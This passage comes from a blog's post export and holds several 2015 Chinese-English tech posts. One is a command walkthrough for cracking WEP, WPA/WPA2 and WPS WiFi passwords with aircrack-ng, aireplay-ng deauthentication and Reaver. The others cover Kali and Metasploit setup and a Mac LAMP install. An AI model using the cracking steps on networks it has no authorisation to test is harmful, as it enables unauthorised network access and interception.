        
        
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Mac </tag>
            
            <tag> Mysql </tag>
            
            <tag> Nginx </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Aircrack-ng hack wireless network]]></title>
      <url>/2015/09/02/Linux/Aircrack/</url>
      <content type="html"><![CDATA[<p>Aircrack-ng is a network software suite consisting of a detector, packet sniffer, WEP and WPA/WPA2-PSK cracker and analysis tool for 802.11 wireless LANs.  </p>
<a id="more"></a>  
<h2 id="一、Kali-Linux"><a href="#一、Kali-Linux" class="headerlink" title="一、Kali Linux"></a>一、Kali Linux</h2><p>ifconfig<br>iwconfig<br>1、Cracking WEP with Clients:<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">airmon-ng</div><div class="line">airmon-ng start (<span class="name">interface</span>)</div><div class="line">kill process</div><div class="line">airodump-ng (<span class="name">interface</span>)</div><div class="line">airodump-ng -c <span class="number">6</span> -w (<span class="name">filename</span>) --bssid (<span class="name">bssid</span>) (<span class="name">interface</span>)</div><div class="line">aireplay-ng <span class="number">-1</span> <span class="number">0</span> -a (<span class="name">bssid</span>) (<span class="name">interface</span>)</div><div class="line">aireplay-ng <span class="number">-3</span> -b (<span class="name">bssid</span>) (<span class="name">interface</span>)</div><div class="line">aircrack-ng (<span class="name">filename-01</span>.cap)</div><div class="line">service networking start</div><div class="line">service network-manager start</div></pre></td></tr></table></figure></p>
<p>2、Cracking WEP with no Clients:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">airmon-ng</span></div><div class="line"><span class="selector-tag">airmon-ng</span> <span class="selector-tag">start</span> (interface)</div><div class="line"><span class="selector-tag">kill</span> <span class="selector-tag">process</span></div><div class="line"><span class="selector-tag">airodump-ng</span> (interface)</div><div class="line"><span class="selector-tag">airodump-ng</span> <span class="selector-tag">-c</span> <span class="selector-tag">6</span> <span class="selector-tag">-w</span> (filename1) <span class="selector-tag">--bssid</span> (bssid) (interface)</div><div class="line"><span class="selector-tag">aireplay-ng</span> <span class="selector-tag">-1</span> <span class="selector-tag">0</span> <span class="selector-tag">-a</span> (bssid) (interface)</div><div class="line"><span class="selector-tag">aireplay-ng</span> <span class="selector-tag">-4</span> <span class="selector-tag">-b</span> (bssid) <span class="selector-tag">-h</span> (own mac) (interface)</div><div class="line"><span class="selector-tag">packetforge-ng</span> <span class="selector-tag">-0</span> <span class="selector-tag">-a</span> (bssid) <span class="selector-tag">-h</span> (own mac) <span class="selector-tag">-k</span> <span class="selector-tag">255</span><span class="selector-class">.255</span><span class="selector-class">.255</span><span class="selector-class">.255</span> <span class="selector-tag">-l</span> <span class="selector-tag">255</span><span class="selector-class">.255</span><span class="selector-class">.255</span><span class="selector-class">.255</span> <span class="selector-tag">-y</span> (file.xor) <span class="selector-tag">-w</span> (filename2.cap)</div><div class="line"><span class="selector-tag">aireplay-ng</span> <span class="selector-tag">-2</span> <span class="selector-tag">-r</span> (filename2.cap) (interface)</div><div class="line"><span class="selector-tag">aircrack-ng</span> (filename1.cap)</div><div class="line"><span class="selector-tag">service</span> <span class="selector-tag">networking</span> <span class="selector-tag">start</span></div><div class="line"><span class="selector-tag">service</span> <span class="selector-tag">network-manager</span> <span class="selector-tag">start</span></div></pre></td></tr></table></figure></p>
<p>3、Cracking WPA WPA2:<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">airmon-ng</div><div class="line">airmon-ng start (<span class="class"><span class="keyword">interface</span>)</span></div><div class="line">kill process</div><div class="line">airodump-ng (<span class="class"><span class="keyword">interface</span>)</span></div><div class="line">airodump-ng -c (channel) -w wpa --bssid (<span class="class"><span class="keyword">interface</span>)</span></div><div class="line">aireplay-ng <span class="number">-0</span> <span class="number">1</span> -a [AP’s mac] -c [client’s mac] (<span class="class"><span class="keyword">interface</span>)</span></div><div class="line">aircrack-ng -w wordlist.txt .cap</div></pre></td></tr></table></figure></p>
<p>4、Cracking WPS with Reaver:<br>它利用了WiFi保护设置（WiFi Protected Setup - 下文中简称为WPS）的一个弱点，WPS是许多路由器上都有的一个功能，可以为用户提供简单的配置过程，它与设备中硬编码保存的一个PIN码绑定在一起。Reaver利用的就是PIN码的一个缺陷，最终的结果就是，只要有足够的时间，它就能破解WPA或WPA2的密码。<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">airmon-ng</div><div class="line">airmon-ng start (<span class="class"><span class="keyword">interface</span>)   //开启网卡</span></div><div class="line">kill process</div><div class="line">airodump-ng (<span class="class"><span class="keyword">interface</span>)</span></div><div class="line">wash -i (<span class="class"><span class="keyword">interface</span>) -<span class="title">c</span> 6 -<span class="title">C</span> //监听模式，查找开启<span class="title">wps</span>的<span class="title">ap</span></span></div><div class="line">reaver -i (<span class="class"><span class="keyword">interface</span>) -<span class="title">b</span> [<span class="title">ap</span>’<span class="title">s</span> <span class="title">mac</span>] -<span class="title">d</span> 30 -<span class="title">S</span> -<span class="title">N</span> -<span class="title">vv</span></span></div><div class="line">reaver-i (<span class="class"><span class="keyword">interface</span>) -<span class="title">b</span> [<span class="title">ap</span>'<span class="title">s</span> <span class="title">MAC</span>] -<span class="title">p</span> <span class="title">PIN8</span>位数  //通过<span class="title">wps</span> <span class="title">pin</span> 获取密码</span></div><div class="line">service networking start</div><div class="line">service network-manager start</div></pre></td></tr></table></figure></p>
<h2 id="二、Mac-OS-X"><a href="#二、Mac-OS-X" class="headerlink" title="二、Mac OS X"></a>二、Mac OS X</h2><p>1、Install Xcode and the Xcode Command Line Tools  </p>
<p>2、Agree to Xcode license in Terminal: sudo xcodebuild -license  </p>
<p>3、Install <a href="http://www.macports.org/install.php" target="_blank" rel="external">MacPorts </a>for your version of OS X  </p>
<p>4、在命令行输入port如果command not found<br>   在配置文件.zshrc(.bash_profile)上输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> PATH=<span class="string">"/opt/local/bin:/opt/local/sbin:<span class="variable">$PATH</span>"</span></div></pre></td></tr></table></figure></p>
<p>5、在terminal中输入<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo port <span class="keyword">install</span> aircrack-ng</div></pre></td></tr></table></figure></p>
<p>6、出现Port aircrack-ng not found<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="title">sudo</span> <span class="keyword">port</span> selfupdate</div><div class="line">sudo <span class="keyword">port</span> selfupdate</div></pre></td></tr></table></figure>  </p>
<p>7、6以后再次进行5步骤  </p>
<p>8、get easier access to airport WiFi tool<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ln -s <span class="regexp">/System/</span>Library<span class="regexp">/PrivateFrameworks/</span>Apple80211.framework<span class="regexp">/Versions/</span>Current<span class="regexp">/Resources/</span>airport <span class="regexp">/usr/</span>sbin<span class="regexp">/airport</span></div></pre></td></tr></table></figure>  </p>
<p>9、扫描<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airport en0 <span class="built_in">scan</span></div></pre></td></tr></table></figure>  </p>
<p>10、监听<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="title">sudo</span> air<span class="keyword">port</span> en0 sniff CHANNEL </div></pre></td></tr></table></figure>  </p>
<p>11、破解<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aircrack-ng -w wordlist<span class="selector-class">.txt</span> -<span class="selector-tag">b</span> BSSID airport*.cap</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Aircrack-ng </tag>
            
            <tag> reaver </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[How to config your Kali Linux]]></title>
      <url>/2015/08/29/Linux/KaliConfig/</url>
      <content type="html"><![CDATA[<p>在Parallels Desktop下配置Kali Linux<br>可以参考官网的<a href="https://www.kali.org/kali-linux-documentation/" target="_blank" rel="external">documentation</a>  </p>
<a id="more"></a>  
<h2 id="一、安装parallels-tools"><a href="#一、安装parallels-tools" class="headerlink" title="一、安装parallels tools"></a>一、安装parallels tools</h2><p>参考文档<a href="http://download.parallels.com/desktop/v9/ga/docs/zh_TW/Parallels%20Desktop%20User%27s%20Guide/32791.htm" target="_blank" rel="external">Parallels Tools</a><br>1、在parallels desktop的操作菜单下选择安装parallels tools<br>2、在终端中获取root  </p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">su</span></div></pre></td></tr></table></figure>
<p>3、检查是否已经挂载parallels tools CD镜像  </p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount <span class="string">| grep iso9660</span></div></pre></td></tr></table></figure>
<p>如果返回以下资讯</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/dev/cdrom on /media/cdrom <span class="keyword">type</span> iso9660 (ro,exec,nosuid,nodev,uid=0)</div></pre></td></tr></table></figure>
<p>则挂载成功。  </p>
<p>如果没有返回任何值或出现以下资讯<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/dev/cdrom on /media/cdrom <span class="keyword">type</span> iso9660 (ro,noexec,nosuid,nodev,uid=0)</div></pre></td></tr></table></figure><br>则使用以下命令先卸载镜像并重新安装</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">umount <span class="regexp">/dev/</span>cdrom</div><div class="line">mount -o exec <span class="regexp">/dev/</span>cdrom <span class="regexp">/media/</span>cdrom</div></pre></td></tr></table></figure>
<p>4、当镜像挂载成功后，进入镜像的路径  </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cd <span class="regexp">/media/</span>cdrom<span class="regexp">/</span></div></pre></td></tr></table></figure>
<p>5、在root权限下下载安装</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./<span class="keyword">install</span></div></pre></td></tr></table></figure>
<h2 id="二、更新软件源"><a href="#二、更新软件源" class="headerlink" title="二、更新软件源"></a>二、更新软件源</h2><p>修改sources.list文件：  </p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">leafpad /etc/apt/sources.<span class="built_in">list</span></div></pre></td></tr></table></figure>
<p>然后选择添加以下适合自己较快的源（可自由选择喔）：<br>1、中科大kali源  </p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">deb <span class="string">http:</span><span class="comment">//mirrors.ustc.edu.cn/kali sana main non-free contrib</span></div><div class="line">deb <span class="string">http:</span><span class="comment">//mirrors.ustc.edu.cn/kali-security/ sana/updates main contrib non-free</span></div><div class="line">deb-src <span class="string">http:</span><span class="comment">//mirrors.ustc.edu.cn/kali-security/ sana/updates main contrib non-free</span></div></pre></td></tr></table></figure>
<p>2、aliyun update  </p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">deb <span class="string">http:</span><span class="comment">//mirrors.aliyun.com/kali sana main non-free contrib</span></div><div class="line">deb <span class="string">http:</span><span class="comment">//mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</span></div><div class="line">deb-src <span class="string">http:</span><span class="comment">//mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</span></div></pre></td></tr></table></figure>
<p>对软件进行一次整体更新  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get <span class="keyword">update</span> &amp; apt-<span class="keyword">get</span> <span class="keyword">upgrade</span></div><div class="line">apt-<span class="keyword">get</span> dist-<span class="keyword">upgrade</span> </div></pre></td></tr></table></figure>
<h2 id="三、安装中文输入法"><a href="#三、安装中文输入法" class="headerlink" title="三、安装中文输入法"></a>三、安装中文输入法</h2><p>1、ibus  </p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line">apt-<span class="keyword">get</span> install ibus ibus-pinyin</div></pre></td></tr></table></figure>
<p>2、fcitx  </p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-<span class="built_in">get</span> install fcitx fcitx-pinyin fcitx-<span class="keyword">module</span>-cloudpinyin fcitx-googlepinyin</div></pre></td></tr></table></figure>
<p>3、搜狗输入法<a href="http://pinyin.sogou.com/linux/" target="_blank" rel="external">官网</a><br>先下载输入法deb文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">apt-get -f <span class="keyword">install</span></div><div class="line">apt-<span class="keyword">get</span> <span class="keyword">install</span> fcitx fcitx-pinyin fcitx-<span class="keyword">module</span>-cloudpinyin fcitx-googlepinyin</div><div class="line">dpkg -i 搜狗输入法.deb</div></pre></td></tr></table></figure>  
<p>安装完成后，可以配置输入法  </p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">im-<span class="built_in">config</span></div></pre></td></tr></table></figure>
<p>然后重启系统~  </p>
<p>另：安装中文字体  </p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-<span class="built_in">get</span> install ttf-wqy-microhei</div><div class="line">fc-cache -<span class="built_in">fv</span></div></pre></td></tr></table></figure>
<h2 id="四、运行-Metasploit-Framework"><a href="#四、运行-Metasploit-Framework" class="headerlink" title="四、运行 Metasploit Framework"></a>四、运行 Metasploit Framework</h2><p>依照kali linux网络服务策略，Kali没有自动启动的网络服务，包括数据库服务在内。所以为了让metasploit以支持数据库的方式运行有些必要的步骤。<br>1、启动Kali的PostgreSQL服务<br>Metasploit 使用PostgreSQL作为数据库，所以必须先运行它。  </p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service postgresql <span class="literal">start</span></div></pre></td></tr></table></figure>
<p>你可以用<code>ss -ant</code>的输出来检验PostgreSQL是否在运行，然后确认5432端口处于listening状态。  </p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">State</span> <span class="selector-tag">Recv-Q</span> <span class="selector-tag">Send-Q</span> <span class="selector-tag">Local</span> <span class="selector-tag">Address</span><span class="selector-pseudo">:Port</span> <span class="selector-tag">Peer</span> <span class="selector-tag">Address</span><span class="selector-pseudo">:Port</span></div><div class="line"><span class="selector-tag">LISTEN</span> 0 128 :<span class="selector-pseudo">::22</span> :::*</div><div class="line"><span class="selector-tag">LISTEN</span> 0 128 *<span class="selector-pseudo">:22</span> *:*</div><div class="line"><span class="selector-tag">LISTEN</span> 0 128 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:5432</span> *:*</div><div class="line"><span class="selector-tag">LISTEN</span> 0 128 <span class="selector-pseudo">::1</span><span class="selector-pseudo">:5432</span> :::*	</div></pre></td></tr></table></figure>
<p>2、Initialise the Metasploit PostgreSQL Database<br>With PostgreSQL up and running, we next need to create and initialize the msf database.  </p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">msfdb init</span></div></pre></td></tr></table></figure>
<p>3、Launch msfconsole in Kali<br>Now that the PostgreSQL service is up and running and the database is initialized, you can launch msfconsole and verify database connectivity with the db_status command as shown below.  </p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">msfconsole</div><div class="line">msf &gt; db_status</div><div class="line"><span class="string">[*]</span> postgresql connected to msf3</div><div class="line">msf &gt;</div></pre></td></tr></table></figure>
<h2 id="五、安装无线网卡驱动"><a href="#五、安装无线网卡驱动" class="headerlink" title="五、安装无线网卡驱动"></a>五、安装无线网卡驱动</h2><p>设备菜单下选择自己的无线网卡一栏，使用的是360免费wifi，驱动需要从网上找，这里放个<a href="https://github.com/kuba-moo/mt7601u" target="_blank" rel="external">github</a>上的资源。    </p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">lsusb</span></div></pre></td></tr></table></figure>
<p>返回  </p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Bus </span><span class="number">004</span> Device <span class="number">004</span>: ID <span class="number">148</span>f:<span class="number">760</span>b Ralink Technology, Corp. MT7601U Wireless Adapter</div></pre></td></tr></table></figure>
<p>可知USB ID号为：148f:760b 谷歌后了解到该序列号对应的Mt7601U芯片组，最后一个“U”指的即是USB接口，搜索适合该驱动，可以到gtihub上找，要让驱动匹配linux的核心。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Kali </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mac Yosemite Lamp环境安装]]></title>
      <url>/2015/08/25/Mac/Mamp/</url>
      <content type="html"><![CDATA[<p>Lamp is a tool to develop websites<br>With the help of Homebrew  </p>
<a id="more"></a>  
<p><a href="https://echo.co/blog/os-x-1010-yosemite-local-development-environment-apache-php-and-mysql-homebrew" target="_blank" rel="external">OS X 10.10 Yosemite</a><br><a href="http://segmentfault.com/a/1190000000606752" target="_blank" rel="external">Lamp</a></p>
<h2 id="一、Apache"><a href="#一、Apache" class="headerlink" title="一、Apache"></a>一、Apache</h2><p>Apache的话使用mac自带的基本就够了，可以使用以下命令控制Apache<br>Mac Yosemite下的配置</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>sudo apachectl start</div><div class="line"><span class="variable">$ </span>sudo apachectl restart</div><div class="line"><span class="variable">$ </span>sudo apachectl stop</div></pre></td></tr></table></figure>
<p>配置:<code>sudo vim /etc/apache2/httpd.conf</code> 去掉前面的＃ 如下的行</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-id">#LoadModule</span> php5_module libexec/apache2/libphp5<span class="selector-class">.so</span></div><div class="line"><span class="selector-id">#LoadModule</span> userdir_module libexec/apache2/mod_userdir<span class="selector-class">.so</span></div><div class="line"><span class="selector-id">#Include</span> /private/etc/apache2/extra/httpd-userdir<span class="selector-class">.conf</span></div><div class="line"><span class="selector-id">#LoadModule</span> authz_core_module libexec/apache2/mod_authz_core<span class="selector-class">.so</span></div><div class="line"><span class="selector-id">#LoadModule</span> authz_host_module libexec/apache2/mod_authz_host<span class="selector-class">.so</span>  </div><div class="line"><span class="selector-id">#Include</span> /private/etc/apache2/extra/httpd-vhosts.conf</div></pre></td></tr></table></figure>
<p><code>sudo vim /etc/apache2/extra/httpd-userdir.conf</code> 去掉前面的＃如下的行</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">Include</span> /private/etc/apache2/users/*.conf</span></div></pre></td></tr></table></figure>
<p>/etc/apache2/users/ 里添加文件<br>添加 username.conf 内容如下</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="keyword">Directory</span> <span class="string">"/Users/username/Sites"</span>&gt;</div><div class="line">    <span class="keyword">Options</span> Indexes MultiViews</div><div class="line">    AllowOverride <span class="keyword">None</span></div><div class="line">    Require all granted</div><div class="line">&lt;/<span class="keyword">Directory</span>&gt;</div></pre></td></tr></table></figure>  
<p>修改/etc/apache2/httpd.conf内容</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="attribute"><span class="nomarkup">DocumentRoot</span></span> <span class="string">"/Users/username/Sites"</span></div><div class="line"><span class="section">&lt;Directory "/Users/username/Sites"&gt;</span></div><div class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> Indexes MultiViews</div><div class="line">    <span class="attribute">AllowOverride</span> <span class="literal">All</span></div><div class="line">    <span class="attribute"><span class="nomarkup">Allow</span></span> from <span class="literal">all</span></div><div class="line"><span class="section">&lt;/Directory&gt;</span> </div></pre></td></tr></table></figure> 
<p>运行<code>sudo vim /etc/apache2/extra/httpd-vhosts.conf</code>，就打开了配置虚拟主机文件httpd-vhost.conf，配置虚拟主机了。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="section">&lt;VirtualHost *:80&gt;</span></div><div class="line">    <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> <span class="string">"/Users/用户名/Sites"</span></div><div class="line">    <span class="attribute"><span class="nomarkup">ServerName</span></span> localhost</div><div class="line">    <span class="attribute">ErrorLog</span> <span class="string">"/private/var/log/apache2/sites-error_log"</span></div><div class="line">    <span class="attribute">CustomLog</span> <span class="string">"/private/var/log/apache2/sites-access_log"</span> common</div><div class="line">    <span class="section">&lt;Directory /&gt;</span></div><div class="line">        <span class="attribute"><span class="nomarkup">Options</span></span> Indexes FollowSymLinks MultiViews</div><div class="line">        <span class="attribute">AllowOverride</span> None</div><div class="line">        <span class="attribute"><span class="nomarkup">Order</span></span> deny,allow</div><div class="line">        <span class="attribute"><span class="nomarkup">Allow</span></span> from <span class="literal">all</span></div><div class="line">    <span class="section">&lt;/Directory&gt;</span></div><div class="line"><span class="section">&lt;/VirtualHost&gt;</span></div></pre></td></tr></table></figure>
<p>这样sites目录就是网站根目录了，代码都往这个下头丢</p>
<h2 id="二、MySQL"><a href="#二、MySQL" class="headerlink" title="二、MySQL"></a>二、MySQL</h2><p>Next step is to install MySQL:<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">brew </span><span class="keyword">install </span>mysql</div></pre></td></tr></table></figure></p>
<p>And start the database server:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql<span class="selector-class">.server</span> start</div></pre></td></tr></table></figure></p>
<p>To seure our MySQL server, we’ll exececute the provided secure_mysql_installation binary to change the root password, remove anonymous users and disbale remote root logins:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_secure_installation</div></pre></td></tr></table></figure></p>
<p>Test connection<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">mysql -uroot -p</span></div></pre></td></tr></table></figure></p>
<p>ERROR! The server quit without updating PID file<br>解决方法：可能由于僵尸进程mysqld</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>ps -ef|grep mysqld  </div><div class="line"><span class="variable">$ </span>kill -<span class="number">9</span> 进程号</div></pre></td></tr></table></figure>
<p>彻底卸载mysql方法</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">先ps下 把进程杀掉</div><div class="line"><span class="variable">$ </span>brew remove mysql</div><div class="line"><span class="variable">$ </span>brew cleanup</div><div class="line"><span class="variable">$ </span>sudo rm -rf /usr/local/var/mysql</div></pre></td></tr></table></figure>
<h2 id="三、PHP安装（apache方式）"><a href="#三、PHP安装（apache方式）" class="headerlink" title="三、PHP安装（apache方式）"></a>三、PHP安装（apache方式）</h2><p>PHP在mac下默认安装了，但是不好控制版本，利用brew可以再mac下安装最新版本，甚至是多个版本。github上的<a href="https://github.com/Homebrew/homebrew-php" target="_blank" rel="external">安装介绍</a></p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ <span class="keyword">brew </span>tap homebrew/dupes</div><div class="line">$ <span class="keyword">brew </span>tap homebrew/versions</div><div class="line">$ <span class="keyword">brew </span>tap homebrew/php  </div><div class="line">$ <span class="keyword">brew </span>install php56</div></pre></td></tr></table></figure>
<p>修改apache上的路径</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo vim <span class="regexp">/etc/</span>apache2/httpd.conf</div><div class="line">内容改成 LoadModule php5_module    local<span class="regexp">/Cellar/</span>php56<span class="regexp">/5.6.12/</span>libexec<span class="regexp">/apache2/</span>libphp5.so</div></pre></td></tr></table></figure>
<p>开机启动<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cp /usr/local/Cellar/php56/<span class="number">5.6</span>.<span class="number">12</span>/homebrew<span class="selector-class">.mxcl</span><span class="selector-class">.php56</span><span class="selector-class">.plist</span> ~/Library/LaunchAgents/</div><div class="line">launchctl load -w ~/Library/LaunchAgents/homebrew<span class="selector-class">.mxcl</span><span class="selector-class">.php56</span><span class="selector-class">.plist</span></div></pre></td></tr></table></figure></p>
<p>由于OSX已经自带了PHP环境，因此需要修改系统路径，优先运行brew安装的版本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">在~/.zashrc下添加</div><div class="line"><span class="built_in">export</span> PATH=<span class="string">"<span class="variable">$(brew --prefix homebrew/php/php56)</span>/bin:<span class="variable">$PATH</span>"</span></div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Mac </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Mac </tag>
            
            <tag> Apache </tag>
            
            <tag> Mysql </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mac必备工具]]></title>
      <url>/2015/08/23/Mac/mac%E5%B7%A5%E5%85%B7/</url>
      <content type="html"><![CDATA[<h2 id="一、Brew"><a href="#一、Brew" class="headerlink" title="一、Brew"></a>一、Brew</h2><p>Brew对于mac，就像apt-get对于ubuntu，安装软件的好帮手，不能方便更多…<br>brew的安装方式如下：Brew官网</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ruby <span class="_">-e</span> <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>"</span></div></pre></td></tr></table></figure>
<p>自检：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ <span class="keyword">brew </span>doctor</div></pre></td></tr></table></figure>
<p>常用命令：</p>
